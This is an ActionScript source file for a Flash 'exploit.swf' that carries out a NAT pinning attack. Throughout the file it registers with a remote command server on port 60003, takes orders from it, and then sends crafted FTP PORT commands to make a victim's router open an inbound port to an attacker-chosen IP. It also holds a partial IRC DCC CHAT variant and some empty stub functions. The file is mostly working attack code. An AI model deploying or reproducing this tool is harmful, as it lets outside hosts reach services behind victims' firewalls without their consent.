//as3compile exploit.as -o exploit.swf
package {
	import flash.display.MovieClip;
	import flash.net.Socket;
	import flash.events.*;
	import flash.system.Security;
	import flash.external.*; 
	import flash.system.Capabilities;
	
	public class Main extends MovieClip {
		static var socket:Socket
		static var socketCMD:Socket
		var sServer:String
		var iServerPort:int
		var sType:String
		var sCallbackPort:String
		var sCallbackIP:String
		var sClientID:String

      		function Main() {
			//get external vars
			sServer= root.loaderInfo.parameters.server as String;
			sType= root.loaderInfo.parameters.type as String;
			sCallbackPort = root.loaderInfo.parameters.cp as String;
			sCallbackIP = root.loaderInfo.parameters.ci as String;
			if (sType !=null){
				if (sType.toUpperCase()=="IRC"){iServerPort = 6667;}
				if (sType.toUpperCase()=="FTP"){startFTP();;}
				if (sType.toUpperCase()=="CMD"){connectCMD(sServer)}
			}	
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START COMMAND CHANNEL +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function connectCMD(server:String):void{
			socketCMD = new Socket();
			socketCMD.addEventListener(Event.CONNECT, onConnectCMD);
			socketCMD.addEventListener(Event.CLOSE, onCloseCMD);
			socketCMD.addEventListener(IOErrorEvent.IO_ERROR, onError);
			socketCMD.addEventListener(ProgressEvent.SOCKET_DATA, onResponseCMD);
			socketCMD.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socketCMD.connect(server,60003);
		}
		function onConnectCMD(e:Event):void{
			trace("Connected to Command Server")
			//socketCMD.writeUTFBytes("REG " + socketCMD.localAddress + "\r\n");//not supported in flash, need adobe air
			socketCMD.writeUTFBytes("REG " + sCallbackIP + "\r\n");
		}
		function onResponseCMD(e:ProgressEvent):void {
			if (socketCMD.bytesAvailable>0) {
				var data:String = socketCMD.readUTFBytes(socketCMD.bytesAvailable);
				var dataparts:Array = data.split(" ");
				switch(dataparts[0]){
					case "SET":
						if (dataparts[1]=="ID"){
							sClientID = dataparts[2];
							trace("Client Id = " + sClientID);
						}
						socketCMD.writeUTFBytes("POLL " + sClientID + "\r\n");socketCMD.flush();
						break;
					case "TEST":
						sCallbackIP = dataparts[2];
						sCallbackPort = dataparts[3];
						switch(dataparts[1]){
							case "FTP":
								startFTP();
								break;
							case "IRC":
							case "SIP":
							default:
								trace("Received invalid test protocol: " + dataparts[1]);
								break;
						}
						break;
					case "FIN":
						socketCMD.close();//todo, general cleanup of ALL open sockets
						break;
					default:
						trace("Invalid server command: " + data);
				}
			}
		}
		function onCloseCMD(e:Event):void {
			// Security error is thrown if this line is excluded
			socketCMD.close();
		}
		public static function createGUID():String {
			var uid:Array = new Array();
			var chars:Array = new Array( 48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70 );
			var separator:uint = 45;
			var template:Array = new Array( 8,4,4,4,12 );
     			
			for ( var a:uint = 0; a < template.length; a++ ) {
				for ( var b:uint = 0; b < template[a]; b++ ) {
					uid.push( chars[ Math.floor( Math.random() *  chars. length ) ] );
        			}
				if ( a < template.length - 1 ) {
					//uid.push( separator );
				}
			}
     
		    return String.fromCharCode.apply( null, uid );
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ END COMMAND CHANNEL +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START FTP +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startFTP():void{
			trace("Starting FTP Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectFTP);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseFTP)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,21);
		}
		function onConnectFTP(e:Event):void {
			trace("FTP client connected to " + sServer);
		}
		function onResponseFTP(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable);
				trace("FTP in: " + data);
				data = data.substr(0,3)
				if (data=="220"){socket.writeUTFBytes("USER " + sClientID + " \r\n");socket.flush();}
				if (data=="331"){socket.writeUTFBytes("PASS natpin@work.net\r\n");socket.flush();}
				//logged in
				if (data=="230"){
					trace( "FTP NatPinTest: " + "PORT " + sCallbackIP.split(".").join(",") + "," + calcFTPPort(int(sCallbackPort)) + "\r\n");
					socket.writeUTFBytes("PORT " + sCallbackIP.split(".").join(",") + "," + calcFTPPort(int(sCallbackPort)) + "\r\n");
					socket.flush();
				}
				if (data=="200"){
					//port command succesfull, send list command
					socket.writeUTFBytes("LIST\r\n");
					socket.flush();
				}
			}
		}
		function calcFTPPort(port:int):String{
			var result:String ="";
			var x:int = port%256;
			var y:int = (port -x)/256;
			result = String(y) + "," + String(x);
			return result
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START IRC +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START SIP +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START ALL_PROTO +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function onConnect(e:Event):void {
			trace("connected")
		}

		function onClose(e:Event):void {
			// Security error is thrown if this line is excluded
			socket.close();
		}

		function onError(e:IOErrorEvent):void {
			trace("IO Error: "+e);
		}

		function onSecError(e:SecurityErrorEvent):void {
			trace("Security Error: "+e);
		}

		function onResponse(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable)
				if(sType.toUpperCase()=="IRC"){
						trace("IRC: " + data)
						// init
						if (data.indexOf("NOTICE")>0){socket.writeUTFBytes("NICK natpin\r\nUSER natpin natpin 127.0.0.1:natpin\r\n")};socket.flush()
						//end of motd
						if (data.indexOf("376")>0){socket.writeUTFBytes("PRIVMSG natpinserver :\1DCC CHAT chat "+sCallbackIP+" "+ sCallbackPort+"\1\r\n")};socket.flush()
				}
				if(sType.toUpperCase()=="FTP"){

				}
			}
		}

		function calcFTP(port,ip):String{
		}
		function calcIRC(port,ip):String{
		}
	}
}
